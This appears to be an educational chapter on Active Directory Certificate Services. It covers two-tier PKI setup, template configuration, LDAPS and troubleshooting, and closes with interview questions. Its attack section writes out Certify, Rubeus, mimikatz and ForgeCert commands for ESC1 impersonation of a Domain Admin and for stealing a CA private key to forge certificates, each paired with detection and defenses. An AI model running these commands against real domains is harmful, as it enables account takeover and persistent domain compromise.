# 04 — AD Certificate Services (AD CS)

> **Section:** 03 — AD Authentication Protocols  
> **Difficulty:** Advanced  
> **Ports:** 443 (HTTPS enrollment), 80 (CRL), 135/49152+ (RPC)

---

## 📌 What is AD CS?

Every time you see a padlock in a browser, connect to a secure VPN, or use a smart card — a **certificate** is doing the work. Certificates prove identity using cryptography instead of passwords.

**Active Directory Certificate Services (AD CS)** is Microsoft's built-in **Certificate Authority (CA)** — the system that issues, manages, and revokes digital certificates within an organisation.

> **Simple definition:**  
> AD CS is a role in Windows Server that acts as a trusted authority for issuing digital certificates to users, computers, and services — enabling encrypted communications and certificate-based authentication.

### Why Certificates Are Better Than Passwords

```
Password:
  → Can be guessed, phished, reused, or stolen
  → Transmitted (even hashed) over the network
  → Requires complexity rules humans work around

Certificate:
  → Contains a public key (shareable) + private key (never leaves device)
  → Cannot be guessed — mathematically complex
  → Cannot be "phished" in the traditional sense (private key stays on device)
  → Used for: HTTPS, smart card login, EAP-TLS Wi-Fi, VPN, code signing
```

---

## 🏗️ AD CS Components

### Certificate Authority (CA) Hierarchy

```
Root CA (offline — most trusted)
  ├── Stored offline (USB/HSM — never connected to network)
  ├── Issues certificates to: Subordinate CAs only
  └── Validity: 10-20 years

      └── Issuing CA (online — day-to-day operations)
            ├── Connected to network (on Windows Server)
            ├── Issues certificates to: Users, Computers, Services
            └── Validity: 5-10 years
                  │
                  ├── Hareesh's user certificate (1 year)
                  ├── DC01 computer certificate (2 years)
                  ├── webapp.company.local SSL cert (1 year)
                  └── svc_smartcard certificate (1 year)

Why two-tier hierarchy?
  If Root CA is compromised → entire PKI is dead
  By keeping Root CA offline → attacker cannot reach it
  Compromise of Issuing CA → can be revoked by Root CA → rebuild Issuing CA
```

### Key Certificate Types

| Certificate Type | Purpose | Issued to |
|-----------------|---------|-----------|
| **Computer** | Machine authentication, HTTPS | Domain computers |
| **User** | User authentication, email signing | Domain users |
| **Domain Controller** | DC authentication, LDAPS | Domain Controllers |
| **Web Server (SSL)** | HTTPS for internal websites | IIS, Apache |
| **Code Signing** | Verify scripts/software are from company | IT admins |
| **Smart Card Logon** | Badge-based Windows login | Privileged users |
| **EAP-TLS** | Certificate-based Wi-Fi auth | All domain users |

---

## 🔧 Real-World AD CS Configuration

### Configuration 1 — Installing AD CS (Two-Tier PKI)

```
─────────────────────────────────────────
STEP 1: Install Root CA (on offline server)
─────────────────────────────────────────
  Server Manager → Add Roles → Active Directory Certificate Services
  → Role Services: Certification Authority ✅
  
  Setup Type: Standalone CA (not domain-joined — offline)
  CA Type: Root CA
  
  Cryptography:
  Key length: 4096 bits
  Hash algorithm: SHA-256
  
  CA Name: Company-Root-CA
  Validity: 20 years
  
  After installation:
  → Export Root CA certificate (company-root-ca.cer)
  → Copy to a USB drive
  → SHUT DOWN this server and store it securely offline
    (literally disconnect from network and power down)

─────────────────────────────────────────
STEP 2: Install Issuing CA (domain-joined, online)
─────────────────────────────────────────
  Server Manager → Add Roles → Active Directory Certificate Services
  → Role Services: Certification Authority ✅
                  Certification Authority Web Enrollment ✅
                  Online Responder ✅
  
  Setup Type: Enterprise CA (domain-joined)
  CA Type: Subordinate CA
  
  CA Name: Company-Issuing-CA
  Validity: 10 years
  
  Request certificate from Root CA:
  → Generate CSR (Certificate Signing Request)
  → Copy CSR to USB → take to offline Root CA
  → On Root CA: issue certificate for Issuing CA
  → Copy signed certificate back to Issuing CA → install it

─────────────────────────────────────────
STEP 3: Publish Root CA to AD
─────────────────────────────────────────
  On Domain Controller:
  certutil -dspublish -f company-root-ca.cer RootCA
  
  Now all domain computers automatically trust the Root CA
  (pushed via GPO — Computer Config → Windows Settings → 
   Security Settings → Public Key Policies → Trusted Root CAs)

─────────────────────────────────────────
STEP 4: Configure CRL (Certificate Revocation List)
─────────────────────────────────────────
  Issuing CA → Properties → Extensions
  → CRL Distribution Points:
    http://pki.company.local/CRL/Company-Issuing-CA.crl
    ldap:///CN=Company-Issuing-CA,...  (AD-based CRL)
  
  Configure IIS to host CRL files:
  IIS → pki.company.local → physical path → C:\inetpub\pki
  Publish CRL: certutil -crl
  
  Why CRL matters:
  When a certificate is stolen or compromised → revoke it
  All systems check the CRL → revoked cert is rejected
```

---

### Configuration 2 — Auto-Enroll Certificates to All Computers

```
Scenario: GP wants all domain computers to automatically get
          a computer certificate (for LDAPS, 802.1X, etc.)

Step 1: Create certificate template
  Issuing CA → Certificate Templates → Manage
  → Duplicate "Computer" template
  → Name: "Company-Computer-Auth"
  
  Template Settings:
  Subject Name: Build from Active Directory
  → Use computer name
  
  Request Handling:
  → Allow private key to be exported: NO (security!)
  
  Security:
  → Domain Computers: Autoenroll ✅, Read ✅, Enroll ✅
  
  Validity: 2 years
  Renewal: 6 weeks before expiry (auto-renew)

Step 2: Publish template
  Issuing CA → Certificate Templates → New → Certificate Template to Issue
  → Select: Company-Computer-Auth

Step 3: Configure Auto-Enrollment GPO
  GPO: Computer Config → Windows Settings → Security Settings
  → Public Key Policies → Certificate Services Client - Auto-Enrollment
  
  → Configuration Model: Enabled
  → Renew expired certificates: ✅
  → Update certificates that use templates: ✅
  → Remove revoked certificates: ✅

Step 4: Wait for GPO refresh or force:
  gpupdate /force
  
  Result:
  All domain computers request and receive certificates automatically ✅
  Certificates used for LDAPS, 802.1X (EAP-TLS), IPSec ✅
  Renewed automatically before expiry ✅

Verify:
  certmgr.msc (on workstation) → Computer certificates → Personal
  → Should show Company-Computer-Auth certificate ✅
```

---

### Configuration 3 — SSL Certificate for Internal Web Server

```
Scenario: Hareesh deployed an internal web application.
          GP needs it to have HTTPS with a trusted certificate.

Step 1: Request SSL certificate via web enrollment
  Browser: http://pki.company.local/certsrv
  → Request a certificate → Advanced certificate request
  → Create and submit a request
  
  Fill in:
  Certificate Template: Web Server
  Name (CN): webapp.company.local
  Alternative names: webapp, webapp.company.local
  Key size: 2048
  
  Submit → Download certificate (webapp.cer)

Step 2: Import into IIS
  IIS Manager → Server → Server Certificates → Complete Certificate Request
  → Select webapp.cer
  → Friendly name: webapp.company.local
  
  IIS Manager → webapp site → Bindings → Add
  → Type: https
  → Port: 443
  → SSL certificate: webapp.company.local ✅

Step 3: Redirect HTTP to HTTPS
  IIS → URL Rewrite → Add Rule
  → Redirect HTTP to HTTPS

Result:
  Users browse https://webapp.company.local
  Browser shows padlock (trusted — company CA trusted by all domain machines) ✅
  Connection encrypted ✅

Alternative — PowerShell method:
  # Request cert via PowerShell
  $cert = Get-Certificate `
      -Template "WebServer" `
      -SubjectName "CN=webapp.company.local" `
      -CertStoreLocation "Cert:\LocalMachine\My"
```

---

### Configuration 4 — Enable LDAPS Using DC Certificate

```
Scenario: GP wants to force all LDAP connections to use LDAPS (port 636).
          DCs need certificates for this.

Step 1: Create Domain Controller certificate template
  Duplicate "Domain Controller" template
  Name: "Company-DC-Certificate"
  
  Subject Name:
  → Build from Active Directory
  → DNS name: DC01.company.local, company.local
  
  Security:
  → Domain Controllers: Autoenroll ✅

Step 2: Publish template (same as Config 2)

Step 3: DCs auto-enroll
  gpupdate /force on each DC
  
Step 4: Verify LDAPS is working
  Test from any workstation:
  ldp.exe → Connection → Connect
  → Server: DC01.company.local
  → Port: 636
  → SSL: checked ✅
  → Should connect without errors ✅

Step 5: Enforce LDAPS only
  GPO → "Domain controller: LDAP server signing requirements"
  → Require signing
```

---

## ⚠️ AD CS Attack Techniques

AD CS has become one of the most targeted components in AD environments. Security researcher Will Schroeder (SpecterOps) identified numerous misconfigurations dubbed **ESC1-ESC11**.

### Attack 1 — ESC1: Misconfigured Certificate Template

```
What: Certificate template allows requesters to specify the Subject Alternative Name (SAN)
      AND the template can be used for client authentication.
      Attacker requests a certificate claiming to be any user — including Domain Admin.

Why it happens:
  Template setting: "Supply in the request" for Subject Name ← dangerous
  + Authentication usage: Client Authentication
  + Low-privileged users can enroll

Step-by-step attack:
  Step 1: Find vulnerable templates using Certify:
    Certify.exe find /vulnerable
    
    Output: ESC1 found!
    Template: UserCertificate
    Enrollment rights: Domain Users (any user can request)
    msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT ← vulnerable

  Step 2: Request certificate as Domain Admin (GP):
    Certify.exe request /ca:Company-Issuing-CA /template:UserCertificate
        /altname:gp@company.com
    
    ← Hareesh (regular user) requesting a cert claiming to be GP

  Step 3: Use certificate to get GP's TGT:
    Rubeus.exe asktgt /user:gp /certificate:[base64cert] /password:[pfx password]
    
    ← Kerberos authentication using the forged certificate
    ← Gets a TGT for GP — Domain Admin

  Step 4: Full domain access as GP ✅
    (Without knowing GP's password at all)

Tools: Certify.exe, Certipy (Linux), Rubeus
```

**Detection:**
```
Event ID 4886 — Certificate request received
Event ID 4887 — Certificate issued
  Watch for:
  → Certificate request where SAN (Subject Alternative Name) differs
    from the requesting user
  → Unusual certificate template usage for privileged accounts

Defender for Identity: "Suspicious certificate usage" alert
```

**Defense:**
```
1. Remove "Supply in the request" from Subject Name setting
   Template must build from Active Directory only

2. Require CA manager approval for sensitive templates:
   Template → Issuance Requirements → CA certificate manager approval: ✅

3. Restrict enrollment rights:
   Template → Security → Remove Domain Users
   Only add specific groups that need this template

4. Use Certify.exe or Certipy defensively to find vulnerable templates:
   Certify.exe find /vulnerable
   Regular audit (quarterly minimum)
```

---

### Attack 2 — ESC2: Misconfigured Template — Any Purpose

```
What: Template has "Any Purpose" or "Subordinate CA" EKU
      Allows attacker to use the certificate for any authentication purpose

Defense:
  Never use "Any Purpose" EKU in certificate templates
  Specify exact purposes: Client Authentication, Server Authentication
  Audit all templates for EKU settings:
  Get-CATemplate | Select-Object Name, *EKU*
```

---

### Attack 3 — ESC4: Vulnerable Certificate Template ACL

```
What: Low-privileged user has write permissions on a certificate template
      Can modify the template to become vulnerable (like ESC1)

Step-by-step:
  Hareesh has "Write" permission on the "Company-Computer-Auth" template
  Hareesh modifies it:
    → Enables "Supply in the request"
    → Adds "Client Authentication" EKU
  Now the template is ESC1-vulnerable
  Hareesh requests cert claiming to be GP ← Domain Admin

Defense:
  Audit certificate template ACLs:
  Certify.exe find /vulnerable
  
  Remove write permissions from non-admin accounts
  Only PKI Admins should have write access to templates
  
  Monitor Event ID 4899 — Certificate template modified
```

---

### Attack 4 — Golden Certificate (Stolen CA Private Key)

```
What: If attacker steals the CA's private key,
      they can issue forged certificates for any user forever.
      Similar to Golden Ticket — but for PKI.

How:
  Attacker compromises the Issuing CA server
  Exports CA private key:
    mimikatz: crypto::capi
    mimikatz: crypto::certificates /export /systemstore
  
  Creates forged certificate for any user:
    ForgeCert.exe --CaCertPath stolen_ca.pfx `
                  --CaCertPassword [password] `
                  --Subject "CN=GP" `
                  --SubjectAltName "gp@company.com" `
                  --ForceSmartCardLogon
  
  Uses forged cert to get Kerberos TGT as GP ← Domain Admin

Defense:
  Protect CA server as Tier 0 (same as Domain Controllers)
  Store CA private key in HSM (Hardware Security Module)
  Monitor: Event ID 70 — Private key export
  Never expose CA server to internet
  Run CA on offline server if possible (two-tier PKI)
```

---

## 🛡️ AD CS Hardening Checklist

- [ ] Implement two-tier PKI (Root CA offline, Issuing CA online)
- [ ] Protect CA server as Tier 0 — same controls as DC
- [ ] Store CA private key in HSM (Hardware Security Module)
- [ ] Run Certify.exe/Certipy quarterly to find vulnerable templates
- [ ] Remove "Supply in the request" from all user-enrollable templates
- [ ] Remove "Any Purpose" EKU from templates
- [ ] Restrict enrollment rights — no "Domain Users" on sensitive templates
- [ ] Require CA manager approval for high-value certificate templates
- [ ] Audit certificate template ACLs — remove write access from non-admins
- [ ] Monitor Event IDs: 4886, 4887, 4888, 4899
- [ ] Enable CRL and OCSP for certificate revocation
- [ ] Configure certificate lifetime to minimum necessary
- [ ] Deploy Defender for Identity to detect PKI attacks

---

## 🔧 Troubleshooting AD CS

```powershell
# View all certificates issued by the CA
certutil -view -restrict "Disposition=20" -out "RequesterName,CommonName,NotAfter"

# Check certificate status
certutil -verify -urlfetch certificate.cer

# Find certificates expiring in next 30 days
$threshold = (Get-Date).AddDays(30)
Get-ChildItem Cert:\LocalMachine\My |
    Where-Object {$_.NotAfter -lt $threshold} |
    Select-Object Subject, NotAfter, Thumbprint

# Test LDAPS using DC certificate
Test-NetConnection -ComputerName DC01.company.local -Port 636

# Check CRL is accessible
certutil -URL http://pki.company.local/CRL/Company-Issuing-CA.crl

# Revoke a compromised certificate
certutil -revoke [SerialNumber] 1
# Reason codes: 0=unspecified, 1=keyCompromise, 2=caCompromise, 3=affiliationChanged

# Force CRL publication after revocation
certutil -crl

# Check auto-enrollment status on a client
certutil -pulse
```

---

## 🎯 Interview Questions

**Q1. What is AD CS and why would an organisation deploy it?**  
**A:** AD CS (Active Directory Certificate Services) is Microsoft's Certificate Authority role for Windows Server. An organisation deploys it to issue trusted digital certificates to users, computers, and services — enabling HTTPS for internal websites, smart card logon, EAP-TLS Wi-Fi authentication, LDAPS, code signing, and encrypted email. Having an internal CA means all domain machines automatically trust certificates issued by it, without needing to purchase certificates from external vendors for internal use.

---

**Q2. What is the two-tier PKI model and why is it recommended?**  
**A:** The two-tier model has an offline Root CA and an online Issuing CA. The Root CA is kept completely offline (not connected to any network) and only used to issue the Issuing CA's certificate. The Issuing CA is online and handles day-to-day certificate issuance to users and computers. If the Issuing CA is compromised, it can be revoked by the Root CA and rebuilt. If there were only one CA and it was compromised, the entire PKI would be destroyed. The offline Root CA protects the trust anchor.

---

**Q3. What is ESC1 and why is it dangerous?**  
**A:** ESC1 is a certificate template misconfiguration where the template allows the requester to specify the Subject Alternative Name (SAN) in their request, AND the template has Client Authentication EKU, AND low-privileged users can enroll. This means any domain user can request a certificate claiming to be any other user — including Domain Admin — without knowing their password. The certificate can then be used to get a Kerberos TGT for that user. It is dangerous because it completely bypasses password-based authentication and is often not monitored.

---

**Q4. How do you find vulnerable certificate templates in an environment?**  
**A:** Use Certify.exe (Windows) or Certipy (Linux/Python). Run: Certify.exe find /vulnerable — it scans all certificate templates and flags ones with misconfigurations like ESC1-ESC8. It shows: which templates are vulnerable, what the misconfiguration is, and who has enrollment rights. This should be run as a regular defensive audit (quarterly). The same tool is used by attackers to find templates to exploit.

---

**Q5. Scenario — You discover that a regular domain user was able to request a certificate with a Subject Alternative Name of gp@company.com and used it to authenticate to the DC. What happened and how do you fix it?**  
**A:** This is an ESC1 attack. The user exploited a vulnerable certificate template that allowed enrollees to specify the SAN. Fix immediately: (1) Revoke the forged certificate immediately using certutil -revoke [serial] 1. (2) Publish updated CRL: certutil -crl. (3) Find the vulnerable template: Certify.exe find /vulnerable. (4) Fix the template: change Subject Name setting from "Supply in the request" to "Build from Active Directory". (5) Restrict enrollment rights — remove Domain Users. (6) Check if GP's account was used to access anything — review audit logs. (7) Audit ALL certificate templates for similar misconfigurations. (8) Consider whether GP's account needs to be treated as compromised.

---

*"AD CS is one of the most dangerous and overlooked attack surfaces in Active Directory. A misconfigured certificate template can give any domain user Domain Admin without exploiting a single vulnerability — just a configuration mistake. Audit your templates regularly."*
